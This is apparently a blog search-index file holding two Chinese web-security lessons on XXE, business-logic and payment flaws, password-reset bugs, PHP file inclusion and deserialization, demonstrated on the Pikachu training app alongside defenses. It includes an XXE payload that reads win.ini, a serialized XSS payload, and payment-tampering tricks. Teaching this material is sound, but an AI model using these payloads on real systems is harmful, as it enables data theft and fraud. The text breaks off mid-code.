<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络安全-Web应用安全5</title>
      <link href="/posts/websec5.html"/>
      <url>/posts/websec5.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h1><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p><strong>什么是XML？</strong></p><ul><li>一种类似于HTML（超文本标记语言）的可扩展标记语言，可以用来标记数据、定义数据类型</li><li>XML语言没有预定义的标签，允许用户自定义标签和文档结构</li><li>XML被设计用来传输和存储数据</li></ul><p><strong>XML文档结构</strong></p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><h3 id="XML案例"><a href="#XML案例" class="headerlink" title="XML案例"></a>XML案例</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">&quot;18&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">face</span>&gt;</span>可爱的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的女孩<span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML的语法规则"><a href="#XML的语法规则" class="headerlink" title="XML的语法规则"></a>XML的语法规则</h3><ul><li>XML文档必须有一个根元素</li><li>XML元素都必须有一个关闭标签</li><li>XML标签对大小敏感</li><li>XML元素必须被正确的嵌套</li><li>XML属性值必须加引导</li></ul><h3 id="DTD与DTD实体"><a href="#DTD与DTD实体" class="headerlink" title="DTD与DTD实体"></a>DTD与DTD实体</h3><p><strong>DTD（Document Type Definition）</strong></p><ul><li>DTD（文档定义类型）的作用是定义XML文档的合法构建模块</li><li>DTD可以被成行的声明于XML文档中，也可以作为一个外部引用</li></ul><p><strong>DTD实体</strong></p><ul><li>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</li><li>实体引用是对实体的引用</li><li>实体可在内部或外部进行声明</li></ul><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><p><strong>语法</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="string">&quot;entity-value&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Donald Duck&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">copywrite</span> <span class="string">&quot;Copywrite&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;write;</span><span class="symbol">&amp;copywrite;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><p><strong>语法</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DTD实例：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">copywrite</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://www.sogou.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">XML example：</span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;write;</span><span class="symbol">&amp;copywrite;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XXE概念"><a href="#XXE概念" class="headerlink" title="XXE概念"></a>XXE概念</h3><p><strong>什么是XXE？</strong></p><ul><li>全称是”XML external entity injection”，即XML外部实体注入</li><li>攻击者通过向服务器注入指定的XML实体内容，从而让服务器按照指定的配置进行执行</li><li>服务端接收和解析来自用户端的XML数据，而没有做严格的安全控制，从而导致XML外部实体注入</li></ul><h3 id="基于pikachu靶场的XXE实例"><a href="#基于pikachu靶场的XXE实例" class="headerlink" title="基于pikachu靶场的XXE实例"></a>基于pikachu靶场的XXE实例</h3><p><strong>该案例读取C:&#x2F;Windows&#x2F;win.ini</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.1&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>打开Pikachu中的xxe漏洞页面，将构造好的XML文件内容复制到输入框中，点击”提交”按钮</strong></p><p><img src="/../img/img_artical/net_sec/14.5.1.png" alt="14.5.1"></p><p><strong>浏览器页面中显示win.ini文件内容</strong></p><p><img src="/../img/img_artical/net_sec/14.5.2.png" alt="14.5.2"></p><h3 id="XXE实体注入攻击"><a href="#XXE实体注入攻击" class="headerlink" title="XXE实体注入攻击"></a>XXE实体注入攻击</h3><p><strong>除此之外，利用XXE注入，还可以实现如下攻击：</strong></p><ul><li>执行系统命令</li><li>探测内网端口</li><li>攻击内网网站</li></ul><h3 id="XXE实体注入防御"><a href="#XXE实体注入防御" class="headerlink" title="XXE实体注入防御"></a>XXE实体注入防御</h3><ul><li>禁用外部实体</li><li>过滤和验证用户提交的xml数据</li><li>不允许xml中含有任何自己声明的dtd</li><li>配置xml parser只能使用静态dtd，禁止外来引入</li></ul><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h3><p><strong>什么是逻辑漏洞？</strong></p><ul><li>攻击者利用业务&#x2F;功能上的设计缺陷，获取敏感信息或破坏业务的完整性</li></ul><p><strong>逻辑漏洞的特点</strong></p><ul><li>与系统本身的业务功能相关，决定了逻辑漏洞的多样性</li><li>很难通过有规则的脚本或工具扫描发现</li><li>产生的流量是合法流量，一般的防御手段和设备无法阻止</li><li>一般需要通过人工审计和手动测试发现</li></ul><h3 id="逻辑漏洞常见功能点"><a href="#逻辑漏洞常见功能点" class="headerlink" title="逻辑漏洞常见功能点"></a>逻辑漏洞常见功能点</h3><p><strong>根据常见的业务功能，逻辑漏洞常常出现在以下功能点</strong></p><ul><li>越权漏洞</li><li>验证码漏洞</li><li>支付漏洞</li><li>密码修改&#x2F;找回漏洞</li><li>短信轰炸</li><li>投票、积分、抽奖</li></ul><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p><strong>越权漏洞分类</strong></p><ul><li>越权漏洞主要分为：水平越权和垂直越权</li></ul><p><img src="/../img/img_artical/net_sec/14.5.3.png" alt="14.5.3"></p><h3 id="水平越权案例"><a href="#水平越权案例" class="headerlink" title="水平越权案例"></a>水平越权案例</h3><p><strong>水平越权中有两个用户，权限相同</strong></p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>kobe</td><td>123456</td></tr><tr><td>lucy</td><td>123456</td></tr></tbody></table><p><strong>打开如图所示的页面，以普通用户的角色登录</strong></p><p><img src="/../img/img_artical/net_sec/14.5.4.png" alt="14.5.4"></p><p><strong>登录后，点击查看个人信息，可以看到用户kobe的信息</strong></p><p><img src="/../img/img_artical/net_sec/14.5.5.png" alt="14.5.5"></p><p><strong>修改地址栏的数据，将username&#x3D;kobe，修改为lucy。即可看到lucy的信息。也就是说kobe可以看到lucy信息，即水平越权</strong></p><p><img src="/../img/img_artical/net_sec/14.5.6.png" alt="14.5.6"></p><h3 id="水平越权代码分析"><a href="#水平越权代码分析" class="headerlink" title="水平越权代码分析"></a>水平越权代码分析</h3><p><img src="/../img/img_artical/net_sec/14.5.7.png" alt="14.5.7"></p><p><img src="/../img/img_artical/net_sec/14.5.8.png" alt="14.5.8"></p><h3 id="水平越权案例修复方案"><a href="#水平越权案例修复方案" class="headerlink" title="水平越权案例修复方案"></a>水平越权案例修复方案</h3><p><img src="/../img/img_artical/net_sec/14.5.9.png" alt="14.5.9"></p><h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="支付漏洞概述"><a href="#支付漏洞概述" class="headerlink" title="支付漏洞概述"></a>支付漏洞概述</h3><ul><li>从技术方面看，支付漏洞是一种很简单的逻辑漏洞，通过抓包简单修改数据即可实现</li><li>从危害性方面看，支付漏洞对企业来说危害很大，对用户来说同样危害也大。例如越权支付漏洞可以用他人账户进行消费</li><li>从产生场景看，凡是涉及购买交易的都可能存在支付漏洞</li></ul><h3 id="支付漏洞成因"><a href="#支付漏洞成因" class="headerlink" title="支付漏洞成因"></a>支付漏洞成因</h3><ul><li>开发人员缺乏必要的安全知识，在支付的关键步骤数据包中直接传递数据而这些数据在服务器没有校验，传递过程中也没有签名，导致攻击者通过代理软件随意篡改数据提交</li></ul><h3 id="支付流程"><a href="#支付流程" class="headerlink" title="支付流程"></a>支付流程</h3><p><img src="/../img/img_artical/net_sec/14.5.10.png" alt="14.5.10"></p><h3 id="支付漏洞常见利用方式"><a href="#支付漏洞常见利用方式" class="headerlink" title="支付漏洞常见利用方式"></a>支付漏洞常见利用方式</h3><p><strong>支付金额 &#x3D; 商品价格 * 商品数量 - 优惠券面额 * 优惠券数量 + 运费</strong></p><ul><li>如果可以修改上面的某个关键数据，就有可能减少支付金额。每个值都可能有问题。负数、小数、无限大</li></ul><p><strong>大额商品ID换成小额商品ID</strong></p><p><strong>将支付状态的未支付修改为已支付</strong></p><p><strong>无限制试用</strong></p><ul><li>例如：试用的参数为2，正常购买的参数为1。购买时，将购买参数改为2</li></ul><h3 id="支付漏洞攻击流程"><a href="#支付漏洞攻击流程" class="headerlink" title="支付漏洞攻击流程"></a>支付漏洞攻击流程</h3><p><img src="/../img/img_artical/net_sec/14.5.11.png" alt="14.5.11"></p><h3 id="支付漏洞挖掘"><a href="#支付漏洞挖掘" class="headerlink" title="支付漏洞挖掘"></a>支付漏洞挖掘</h3><p><strong>找到关键的数据包</strong></p><ul><li>可能一个支付操作有三四个数据包，我们要对数据包进行挑选</li></ul><p><strong>分析数据包</strong></p><ul><li>支付数据包中会包含很多的敏感数据（账号、金额、余额、优惠）要尝试对数据包中的各个参数进行分析</li></ul><p><strong>不按套路出牌</strong></p><ul><li>多去想想开发者没有想到的地方</li></ul><h3 id="支付漏洞防御方法"><a href="#支付漏洞防御方法" class="headerlink" title="支付漏洞防御方法"></a>支付漏洞防御方法</h3><ul><li>后端检查每一项值，包括支付状态。校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量</li><li>与第三方支付平台检查，实际支付的金额是否与订单金额一致</li><li>支付参数进行 MD5 校验、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</li><li>金额超过阈值，进行人工审核</li></ul><h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><h3 id="密码找回漏洞-1"><a href="#密码找回漏洞-1" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h3><p><strong>概念</strong></p><ul><li>很多网站都提供了密码找回&#x2F;重置功能，密码找回&#x2F;重置需要提供相应的凭证。如果用户可以在前端获取凭证，或通过猜测、爆破的方式获取凭证，就可以重置任意用户的密码</li></ul><p><strong>常见密码找回漏洞原因</strong></p><ul><li>用户凭证暴力破解</li><li>服务器响应数据包中包含凭证</li><li>服务器响应页面中包含凭证</li><li>可猜测的弱token凭证</li><li>跳过凭证认证步骤</li></ul><h3 id="用户凭证暴力破解"><a href="#用户凭证暴力破解" class="headerlink" title="用户凭证暴力破解"></a>用户凭证暴力破解</h3><p><strong>当当网任意用户密码修改漏洞</strong></p><ul><li>缺陷编号：wooyun-2013-046062</li><li>相关厂商：当当网</li><li>漏洞类型：设计缺陷&#x2F;逻辑错误</li><li>url：<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-046062">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-046062</a></li><li>修复建议:增加次数，防止爆破</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/../img/img_artical/net_sec/14.5.12.png" alt="14.5.12"></p><p><img src="/../img/img_artical/net_sec/14.5.13.png" alt="14.5.13"></p><h3 id="服务器响应数据包中包含凭证"><a href="#服务器响应数据包中包含凭证" class="headerlink" title="服务器响应数据包中包含凭证"></a>服务器响应数据包中包含凭证</h3><p><strong>天天网任意账户密码重置</strong></p><ul><li>缺陷编号：wooyun-2014-058210</li><li>相关厂商：tiantian.com</li><li>漏洞类型：设计缺陷&#x2F;逻辑错误</li><li>url：<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-058210">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-058210</a></li><li>修复建议：禁止返回凭证到浏览器</li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>正常流程找回密码，填好邮箱和验证码，点击下一步，抓包</strong></p><p><img src="/../img/img_artical/net_sec/14.5.14.png" alt="14.5.14"></p><p><strong>可以看到抓包返回数据中会有一个加密字符串，将其记录下来</strong></p><p><img src="/../img/img_artical/net_sec/14.5.15.png" alt="14.5.15"></p><p><strong>然后会给邮箱发一个验证码，然后要求在页面填写验证码，填好之后会进入如下的设置新密码的页面</strong></p><p><img src="/../img/img_artical/net_sec/14.5.16.png" alt="14.5.16"></p><p><strong>仔细观察发现，这里的加密验证字符串和之前返回数据中的那个字符串竟然是同一个。既然如此，那个邮箱验证码就可以直接绕过了</strong></p><p><img src="/../img/img_artical/net_sec/14.5.17.png" alt="14.5.17"></p><h3 id="服务器响应页面中包含凭证"><a href="#服务器响应页面中包含凭证" class="headerlink" title="服务器响应页面中包含凭证"></a>服务器响应页面中包含凭证</h3><p><strong>sohu邮箱任意用户密码重置</strong></p><ul><li>缺陷编号：wooyun-2012-04728</li><li>相关厂商：搜狐</li><li>漏洞类型：设计缺陷&#x2F;逻辑错误</li><li>url：<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-04728">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-04728</a></li><li>修复建议：禁止返回的页面中包含凭证</li></ul><h3 id="可猜测的弱token"><a href="#可猜测的弱token" class="headerlink" title="可猜测的弱token"></a>可猜测的弱token</h3><p><strong>奇虎360任意用户密码修改凭证</strong></p><ul><li>缺陷编号：wooyun-2012-08333</li><li>相关厂商：奇虎360</li><li>漏洞类型：设计缺陷&#x2F;逻辑错误</li><li>url：<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-08333">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-08333</a></li><li>修复建议：使用难猜测的方式生成凭证</li></ul><h3 id="跳过凭证认证步骤"><a href="#跳过凭证认证步骤" class="headerlink" title="跳过凭证认证步骤"></a>跳过凭证认证步骤</h3><p><strong>OPPO手机同步密码随意修改，短信通讯录随意查看</strong></p><ul><li>缺陷编号：wooyun-2013-042404</li><li>相关厂商：广东欧珀移动通讯有限公司</li><li>漏洞类型：设计缺陷&#x2F;逻辑错误</li><li>url：<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-042404">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-042404</a></li><li>修复建议：凭证的生成&#x2F;验证在服务器端完成</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用安全4</title>
      <link href="/posts/websec4.html"/>
      <url>/posts/websec4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h1><h2 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h2><h3 id="文件包含概念"><a href="#文件包含概念" class="headerlink" title="文件包含概念"></a>文件包含概念</h3><p><strong>什么是文件包含？</strong></p><ul><li>在各种开发语言中都提供了内置的文件包含函数，可以使得开发人员在一个代码文件中直接包含(引入)另外一个代码文件</li><li>由于文件包含可以达到复用和方便修改的目的，在代码设计中常常使用</li><li>大多数情况下，文件包含函数中包含的代码文件是固定的</li></ul><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p><strong>什么是文件包含漏洞？</strong></p><ul><li>如果文件包含的代码文件被设计为一个变量，且这个变量可以由前端用户设置，这种情况下，如果没有做足够的安全过滤设置，则可能会引发文件包含漏洞</li><li>攻击者可以设置一个“意想不到”的文件让包含函数去执行，从而造成恶意操作</li></ul><h3 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h3><p><strong>根据不同的配置环境，文件包含漏洞分为如下两种情况</strong></p><ul><li>本地文件包含漏洞</li><li>远程文件包含漏洞</li></ul><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><ul><li>仅能够对服务器本地的文件进行包含，该情况下，攻击者更多的会包含一些固定的系统配置文件，从而读取系统敏感信息</li><li>本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力</li></ul><h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><ul><li>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码</li><li>在web系统的功能设计上尽量不要让前端用户直接传变量给包含函数，即使必须这么做，也一定要做严格的白名单策略进行过滤</li></ul><h3 id="文件包含漏洞函数"><a href="#文件包含漏洞函数" class="headerlink" title="文件包含漏洞函数"></a>文件包含漏洞函数</h3><p><strong>在PHP常见的文件包含的函数</strong></p><ul><li>include()，include_once()</li><li>require()，require_once()</li></ul><p><strong>区别：</strong></p><ul><li>include 引入文件错误，会给出提示，并继续运行剩余的代码</li><li>require 引入文件错误，也会给出提示，但是停止程序的运行</li><li>once表示重复包含时，只加载一次</li></ul><h3 id="文件包含漏洞靶场"><a href="#文件包含漏洞靶场" class="headerlink" title="文件包含漏洞靶场"></a>文件包含漏洞靶场</h3><p><strong>Pikachu是一个带有漏洞的Web应用系统</strong></p><ul><li>Github地址： <a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></li></ul><p><img src="/../img/img_artical/net_sec/14.4.1.png" alt="14.4.1"></p><h3 id="本地文件包含漏洞实例"><a href="#本地文件包含漏洞实例" class="headerlink" title="本地文件包含漏洞实例"></a>本地文件包含漏洞实例</h3><p><strong>按照图示步骤，选择一个选项，关注地址栏中filename的值</strong></p><p><img src="/../img/img_artical/net_sec/14.4.2.png" alt="14.4.2"></p><p><strong>可以通过修改url中filename的方式，加载其它文件</strong></p><ul><li>在include目录下，创建1.txt文件</li></ul><p><img src="/../img/img_artical/net_sec/14.4.3.png" alt="14.4.3"></p><ul><li>通过修改地址栏中的url访问本地1.txt文件</li></ul><p><img src="/../img/img_artical/net_sec/14.4.4.png" alt="14.4.4"></p><h3 id="远程文件包含漏洞实例"><a href="#远程文件包含漏洞实例" class="headerlink" title="远程文件包含漏洞实例"></a>远程文件包含漏洞实例</h3><p><strong>按照图示步骤，同样关注地址中url的filename的值</strong></p><p><img src="/../img/img_artical/net_sec/14.4.5.png" alt="14.4.5"></p><p><strong>需要在php.ini中开启allow_url include 选项</strong></p><p><img src="/../img/img_artical/net_sec/14.4.6.png" alt="14.4.6"></p><p><strong>在其它的网站中创建一个文件1.txt，修改filename的值为远程文件地址</strong></p><p><img src="/../img/img_artical/net_sec/14.4.7.png" alt="14.4.7"></p><h3 id="文件包含漏洞防范措施"><a href="#文件包含漏洞防范措施" class="headerlink" title="文件包含漏洞防范措施"></a>文件包含漏洞防范措施</h3><p><strong>尽量不要将文件包含函数对应的文件放交前端进行选择和操作</strong></p><ul><li>过滤各种..&#x2F;.&#x2F;，http:&#x2F;&#x2F;，https:&#x2F;&#x2F;</li><li>配置php.ini配置文件<ul><li>allow_url_fopen&#x3D; off</li><li>allow_url_include&#x3D; off</li><li>magic_quotes_gpc&#x3D; on</li></ul></li><li>通过白名单策略，仅允许包含运行指定的文件</li></ul><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="序列化-反序列化概念"><a href="#序列化-反序列化概念" class="headerlink" title="序列化&#x2F;反序列化概念"></a>序列化&#x2F;反序列化概念</h3><p><strong>序列化</strong></p><ul><li><p>维基百科中这样定义：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送）以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p></li><li><p>类似于物流快递对物品的处理过程。拆解打包 &#x3D;&gt; 运输 &#x3D;&gt; 拆包组装</p></li><li><p>在面向对象编程语言中，就是将对象转化为字节流，字节流中包括这个对象的数据和信息，便于传输和存储。需要时，通过反序列化从字节流中恢复对象</p></li></ul><p><img src="/../img/img_artical/net_sec/14.4.8.png" alt="14.4.8"></p><h3 id="反序列化漏洞-1"><a href="#反序列化漏洞-1" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p><strong>漏洞成因</strong></p><ul><li>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码</li></ul><h3 id="PHP序列化和反序列化实例"><a href="#PHP序列化和反序列化实例" class="headerlink" title="PHP序列化和反序列化实例"></a>PHP序列化和反序列化实例</h3><p><strong>PHP实现序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 定义类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用类创建对象</span></span><br><span class="line"><span class="variable">$person1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="comment">// 把这个对象进行序列化，并输出</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>序列化执行结果</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>组成部分</th><th>含义</th><th>组成部分</th><th>含义</th></tr></thead><tbody><tr><td>O</td><td>变量类型为Object（对象）</td><td>“name”</td><td>属性的名称</td></tr><tr><td>6</td><td>类名称的长度</td><td>s</td><td>属性值的类型为String（字符串）</td></tr><tr><td>“Person”</td><td>类名称</td><td>7</td><td>属性值的长度</td></tr><tr><td>1</td><td>属性数量</td><td>“pikachu”</td><td>属性值</td></tr><tr><td>s</td><td>属性的数据类型为String（字符串）</td><td></td><td></td></tr><tr><td>4</td><td>属性的名称长度</td><td></td><td></td></tr></tbody></table><p><strong>PHP实现反序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span> -&gt; name</span><br></pre></td></tr></table></figure><h3 id="PHP反序列化相关函数"><a href="#PHP反序列化相关函数" class="headerlink" title="PHP反序列化相关函数"></a>PHP反序列化相关函数</h3><p><strong>常见魔法函数</strong></p><ul><li>一般两个下划线开头的函数都是魔术方法，所谓魔术无非就是会自动调用而已</li><li>__construct()当一个对象创建时被调用</li><li>__destruct()当一个对象销毁时被调用</li><li>__toString()当一个对象被当作一个字符串使用被调用</li><li>__sleep()在对象在被序列化之前被调用</li><li>__wakeup()在反序列化之后立刻被调用</li></ul><h3 id="PHP反序列化漏洞实例"><a href="#PHP反序列化漏洞实例" class="headerlink" title="PHP反序列化漏洞实例"></a>PHP反序列化漏洞实例</h3><p><strong>反序列化漏洞案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 定义类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:29:&quot;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// $payload的值可以来自于用户在地址栏的输入</span></span><br><span class="line"><span 